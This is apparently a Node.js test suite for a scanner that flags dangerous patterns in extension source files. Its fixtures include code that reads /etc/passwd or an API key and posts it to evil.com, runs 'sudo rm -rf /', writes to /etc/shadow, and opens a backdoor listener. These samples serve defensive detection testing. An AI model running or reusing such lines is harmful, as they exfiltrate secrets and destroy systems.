/**
 * Tests for scan-extensions.mjs scanner logic.
 *
 * Run: node --test scan-extensions.test.mjs
 */

import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { writeFile, mkdir, rm } from "node:fs/promises";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { execFileSync } from "node:child_process";

const SCANNER = join(import.meta.dirname, "../bin/scan-extensions.mjs");
const NODE = process.execPath;

function runScanner(dir, extraArgs = []) {
  try {
    const output = execFileSync(NODE, [SCANNER, ...extraArgs, dir], {
      encoding: "utf-8",
      timeout: 10_000,
    });
    return { output, exitCode: 0 };
  } catch (err) {
    return { output: err.stdout + err.stderr, exitCode: err.status };
  }
}

async function withTempDir(fn) {
  const dir = join(tmpdir(), `scan-test-${Date.now()}-${Math.random().toString(36).slice(2)}`);
  await mkdir(dir, { recursive: true });
  try {
    await fn(dir);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
}

// ── Tests ───────────────────────────────────────────────────────────────────

describe("scan-extensions: clean files", () => {
  it("reports no findings for clean code", async () => {
    await withTempDir(async (dir) => {
      await writeFile(join(dir, "clean.ts"), `
        import { readFileSync } from "node:fs";
        const data = readFileSync("/tmp/test.txt", "utf-8");
        console.log(data);
      `);
      const { output, exitCode } = runScanner(dir);
      assert.equal(exitCode, 0, `expected exit 0, got ${exitCode}\n${output}`);
      assert.ok(output.includes("All clean"), output);
    });
  });

  it("skips node_modules", async () => {
    await withTempDir(async (dir) => {
      const nmDir = join(dir, "node_modules", "evil");
      await mkdir(nmDir, { recursive: true });
      await writeFile(join(nmDir, "index.js"), `eval("malicious")`);
      const { output, exitCode } = runScanner(dir);
      assert.equal(exitCode, 0);
      assert.ok(output.includes("All clean"));
    });
  });

  it("skips hidden directories", async () => {
    await withTempDir(async (dir) => {
      const hiddenDir = join(dir, ".hidden");
      await mkdir(hiddenDir, { recursive: true });
      await writeFile(join(hiddenDir, "evil.js"), `eval("malicious")`);
      const { exitCode } = runScanner(dir);
      assert.equal(exitCode, 0);
    });
  });
});

describe("scan-extensions: line rules", () => {
  it("detects child_process exec", async () => {
    await withTempDir(async (dir) => {
      await writeFile(join(dir, "bad.ts"), `
        import { execSync } from "node:child_process";
        execSync("whoami");
      `);
      const { output, exitCode } = runScanner(dir);
      assert.equal(exitCode, 2); // critical = exit 2
      assert.ok(output.includes("Shell command execution"), output);
      assert.ok(output.includes("bad.ts"), output);
    });
  });

  it("does not flag exec without child_process import", async () => {
    await withTempDir(async (dir) => {
      // pi.exec() is not child_process — should not trigger
      await writeFile(join(dir, "ok.ts"), `
        const result = await pi.exec("git", ["status"]);
      `);
      const { output, exitCode } = runScanner(dir);
      assert.equal(exitCode, 0, output);
    });
  });

  it("detects eval()", async () => {
    await withTempDir(async (dir) => {
      await writeFile(join(dir, "bad.js"), `
        const code = getInput();
        eval(code);
      `);
      const { output, exitCode } = runScanner(dir);
      assert.equal(exitCode, 2);
      assert.ok(output.includes("Dynamic code execution"), output);
    });
  });

  it("detects new Function()", async () => {
    await withTempDir(async (dir) => {
      await writeFile(join(dir, "bad.mjs"), `
        const fn = new Function("return 42");
      `);
      const { output, exitCode } = runScanner(dir);
      assert.equal(exitCode, 2);
      assert.ok(output.includes("Dynamic code execution"), output);
    });
  });

  it("detects crypto-mining references", async () => {
    await withTempDir(async (dir) => {
      await writeFile(join(dir, "miner.ts"), `
        const pool = "stratum+tcp://pool.example.com:3333";
      `);
      const { output, exitCode } = runScanner(dir);
      assert.equal(exitCode, 2);
      assert.ok(output.includes("crypto-mining"), output);
    });
  });
});

describe("scan-extensions: source rules (cross-pattern)", () => {
  it("detects data exfiltration (readFile + fetch)", async () => {
    await withTempDir(async (dir) => {
      await writeFile(join(dir, "exfil.ts"), `
        import { readFileSync } from "node:fs";
        const data = readFileSync("/etc/passwd", "utf-8");
        await fetch("https://evil.com", { method: "post", body: data });
      `);
      const { output, exitCode } = runScanner(dir);
      assert.ok(exitCode > 0, `expected non-zero exit, got ${exitCode}`);
      assert.ok(output.includes("exfiltration") || output.includes("File read"), output);
    });
  });

  it("does not flag readFile without network send", async () => {
    await withTempDir(async (dir) => {
      await writeFile(join(dir, "ok.ts"), `
        import { readFileSync } from "node:fs";
        const data = readFileSync("/tmp/config.json", "utf-8");
        console.log(data);
      `);
      const { output, exitCode } = runScanner(dir);
      assert.equal(exitCode, 0, output);
    });
  });

  it("detects env harvesting (process.env + fetch)", async () => {
    await withTempDir(async (dir) => {
      await writeFile(join(dir, "harvest.ts"), `
        const secret = process.env.API_KEY;
        await fetch("https://evil.com", { method: "post", body: secret });
      `);
      const { output, exitCode } = runScanner(dir);
      assert.equal(exitCode, 2);
      assert.ok(output.includes("credential harvesting") || output.includes("Environment"), output);
    });
  });

  it("does not flag process.env without network send", async () => {
    await withTempDir(async (dir) => {
      await writeFile(join(dir, "ok.ts"), `
        const port = process.env.PORT || 3000;
        console.log("Listening on", port);
      `);
      const { exitCode } = runScanner(dir);
      assert.equal(exitCode, 0);
    });
  });

  it("detects obfuscated hex sequences", async () => {
    await withTempDir(async (dir) => {
      await writeFile(join(dir, "obfuscated.js"), `
        const payload = "\\x68\\x65\\x6c\\x6c\\x6f\\x20\\x77\\x6f\\x72\\x6c\\x64";
      `);
      const { output, exitCode } = runScanner(dir);
      assert.ok(exitCode > 0);
      assert.ok(output.includes("obfuscation") || output.includes("Hex"), output);
    });
  });
});

describe("scan-extensions: reports line numbers", () => {
  it("reports correct line number for finding", async () => {
    await withTempDir(async (dir) => {
      await writeFile(join(dir, "lined.ts"), [
        "// line 1: clean",
        "// line 2: clean",
        "// line 3: clean",
        'const x = eval("bad");',
        "// line 5: clean",
      ].join("\n"));
      const { output } = runScanner(dir);
      assert.ok(output.includes("lined.ts:4"), `expected line 4, got:\n${output}`);
    });
  });
});

describe("scan-extensions: new rules", () => {
  it("detects filesystem writes to system paths", async () => {
    await withTempDir(async (dir) => {
      await writeFile(join(dir, "bad.ts"), `
        import { writeFileSync } from "node:fs";
        writeFileSync("/etc/passwd", "evil");
      `);
      const { output, exitCode } = runScanner(dir);
      assert.equal(exitCode, 2);
      assert.ok(output.includes("system path"), output);
    });
  });

  it("detects privilege escalation with child_process", async () => {
    await withTempDir(async (dir) => {
      await writeFile(join(dir, "bad.ts"), `
        import { execSync } from "node:child_process";
        execSync("sudo rm -rf /");
      `);
      const { output, exitCode } = runScanner(dir);
      assert.equal(exitCode, 2);
      // Should detect either privilege-escalation or dangerous-exec
      assert.ok(output.includes("CRITICAL"), output);
    });
  });

  it("does not flag sudo without child_process context", async () => {
    await withTempDir(async (dir) => {
      await writeFile(join(dir, "ok.ts"), `
        // Documentation: run sudo to install
        const help = "Use sudo apt install nodejs";
      `);
      const { exitCode } = runScanner(dir);
      assert.equal(exitCode, 0);
    });
  });

  it("detects network listeners with http context", async () => {
    await withTempDir(async (dir) => {
      await writeFile(join(dir, "backdoor.ts"), `
        import http from "node:http";
        const server = http.createServer((req, res) => {
          res.end("backdoor");
        });
        server.listen(9999);
      `);
      const { output, exitCode } = runScanner(dir);
      assert.ok(exitCode > 0, `expected non-zero exit, got ${exitCode}`);
      assert.ok(output.includes("listener") || output.includes("backdoor") || output.includes("Network"), output);
    });
  });

  it("detects prototype pollution patterns", async () => {
    await withTempDir(async (dir) => {
      await writeFile(join(dir, "bad.js"), `
        const obj = {};
        obj.__proto__.isAdmin = true;
      `);
      const { output, exitCode } = runScanner(dir);
      assert.ok(exitCode > 0);
      assert.ok(output.includes("prototype") || output.includes("pollution"), output);
    });
  });

  it("detects credential logging (same line)", async () => {
    await withTempDir(async (dir) => {
      await writeFile(join(dir, "bad.ts"), `
        console.log(process.env.SECRET_KEY);
      `);
      const { output, exitCode } = runScanner(dir);
      assert.ok(exitCode > 0);
      assert.ok(output.includes("credential") || output.includes("logging"), output);
    });
  });

  it("detects credential logging (multiline console.log with process.env)", async () => {
    await withTempDir(async (dir) => {
      await writeFile(join(dir, "bad.ts"), `
        console.log(
          "token:",
          process.env.SECRET_TOKEN
        );
      `);
      const { output, exitCode } = runScanner(dir);
      assert.ok(exitCode > 0);
      assert.ok(output.includes("credential") || output.includes("logging"), output);
    });
  });

  it("detects unsafe deserialization", async () => {
    await withTempDir(async (dir) => {
      await writeFile(join(dir, "bad.ts"), `
        const data = JSON.parse(req.body);
      `);
      const { output, exitCode } = runScanner(dir);
      assert.ok(exitCode > 0);
      assert.ok(output.includes("deserialization") || output.includes("Unsafe"), output);
    });
  });

  it("detects dynamic require", async () => {
    await withTempDir(async (dir) => {
      await writeFile(join(dir, "bad.js"), `
        const mod = require(userInput);
      `);
      const { output, exitCode } = runScanner(dir);
      // info severity = exit 0, but should appear in output
      assert.ok(output.includes("dynamic") || output.includes("Dynamic") || output.includes("require"), output);
    });
  });

  it("detects template literal fs write to system path", async () => {
    await withTempDir(async (dir) => {
      await writeFile(join(dir, "bad.ts"), "import { writeFileSync } from 'node:fs';\nwriteFileSync(`/etc/shadow`, data);");
      const { output, exitCode } = runScanner(dir);
      assert.equal(exitCode, 2);
      assert.ok(output.includes("system path"), output);
    });
  });
});

describe("scan-extensions: only scans scannable extensions", () => {
  it("ignores .json, .md, .txt files", async () => {
    await withTempDir(async (dir) => {
      await writeFile(join(dir, "config.json"), '{"eval": true}');
      await writeFile(join(dir, "readme.md"), "eval() is dangerous");
      await writeFile(join(dir, "notes.txt"), "eval(code)");
      const { exitCode } = runScanner(dir);
      assert.equal(exitCode, 0);
    });
  });
});
